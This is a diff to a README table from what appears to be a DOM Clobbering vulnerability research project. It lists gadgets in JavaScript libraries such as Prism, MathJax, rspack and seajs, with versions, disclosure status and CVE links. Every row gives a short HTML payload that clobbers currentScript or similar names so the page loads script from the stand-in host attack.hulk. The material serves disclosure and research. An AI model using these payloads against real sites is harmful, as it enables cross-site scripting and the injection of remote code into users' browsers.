@@ -41,17 +41,17 @@ We provide a website hosting Proof-of-Concept (PoC) pages for each DOM Clobberin
 | [Prism](./domc-gadgets/prism.md) | 12.2K | v1.29.0 | ```<img name="currentScript" src="https://attack.hulk/a.js"></img>``` | XSS | TheHulk | Reported | [CVE-2024-53382](https://nvd.nist.gov/vuln/detail/CVE-2024-53382) |
 | [MathJax](./domc-gadgets/mathjax2.md) | 10.1K | v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.hulk"></a>``` | XSS | TheHulk | Accepted | N/A |
 | [MathJax](./domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://attack.hulk"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
-| [tsup](./domc-gadgets/tsup.md) | 8.9K | v8.3.4 | ```<img src="https://attack.hulk" name="currentScript">``` | XSS | TheHulk | Reported | CVE-2024-53384 |
+| [tsup](./domc-gadgets/tsup.md) | 8.9K | v8.3.4 | ```<img src="https://attack.hulk" name="currentScript">``` | XSS | TheHulk | Reported | [CVE-2024-53384](https://nvd.nist.gov/vuln/detail/CVE-2024-53384) |
 | [rspack](./domc-gadgets/rspack.md) | 8.6K | v1.0.0-rc.0 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Fixed | [CVE-2024-43788](https://nvd.nist.gov/vuln/detail/CVE-2024-43788) |
 | [seajs](./domc-gadgets/seajs.md) | 8.3K | v3.0.3 | ```<img name="scripts" src="https://attack.hulk"><img name="scripts" src="https://attack.hulk">``` | XSS | TheHulk | Reported | [CVE-2024-51091](https://nvd.nist.gov/vuln/detail/CVE-2024-51091) |
 | [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://attack.hulk/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
 | [pagefind](./domc-gadgets/pagefind.md) | 3.3K | v1.1.0 | ```<img name="currentScript" src="blob:https://attack.hulk/ui.js"></img>``` | XSS | TheHulk | Accepted | [CVE-2024-45389](https://nvd.nist.gov/vuln/detail/CVE-2024-45389) |
 | [Mavo](./domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Reported | [CVE-2024-53388](https://nvd.nist.gov/vuln/detail/CVE-2024-53388) |
-| [cusdis](./domc-gadgets/cusdis.md) | 2.6K | v1.3.0 | ```<img name="currentScript" data-host="https://attack.hulk">``` | XSS | TheHulk | Reported | CVE-2024-49213 |
+| [cusdis](./domc-gadgets/cusdis.md) | 2.6K | v1.3.0 | ```<img name="currentScript" data-host="https://attack.hulk">``` | XSS | TheHulk | Reported | [CVE-2024-49213](https://nvd.nist.gov/vuln/detail/CVE-2024-49213) |
 | [Stage.js](./domc-gadgets/stage.js.md) | 2.4K | 0.8.10 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Reported | [CVE-2024-53386](https://nvd.nist.gov/vuln/detail/CVE-2024-53386) |
 | [curl](./domc-gadgets/curl.md) | 1.8K | v0.8.13 | ```<img name="scripts" data-curl-run="http://attack.hulk/"><img name="scripts" data-curl-run="http://attack.hulk">``` | XSS | TheHulk | Reported | CVE-2024-49212 |
-| [inspire.js](./domc-gadgets/inspire.js.md) | 1.7K | v1.10 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Reported | CVE-2024-53385 |
-| [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://attack.hulk"><img>``` | XSS | TheHulk | Accepted | CVE-2024-45939 |
+| [inspire.js](./domc-gadgets/inspire.js.md) | 1.7K | v1.10 | ```<img name="currentScript" src="https://attack.hulk"></img>``` | XSS | TheHulk | Reported | N/A |
+| [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://attack.hulk"><img>``` | XSS | TheHulk | Accepted | [CVE-2024-45939](https://nvd.nist.gov/vuln/detail/CVE-2024-45939) |
 | [UMeditor](./domc-gadgets/umeditor.md) | 1.4K | v1.2.2 | ```<a id="UMEDITOR_HOME_URL" href="https://attack.hulk/"></a>``` | XSS | TheHulk | Reported | [CVE-2024-53387](https://nvd.nist.gov/vuln/detail/CVE-2024-53387) |
 | [squirt](./domc-gadgets/squirt.md) | 1.2K | v0.0.1 | ```<img name="scripts" src="http://attack.hulk"><img name="scripts" src="http://attack.hulk">``` | XSS | TheHulk | Reported | N/A |
 | [ckplayer](./domc-gadgets/ckplayer.md) | 1.1K | latest | ```<img name="scripts" src="https://attack.hulk/js/"><img name="scripts" src="https://attack.hulk/js/">``` | XSS | TheHulk | Reported | N/A |
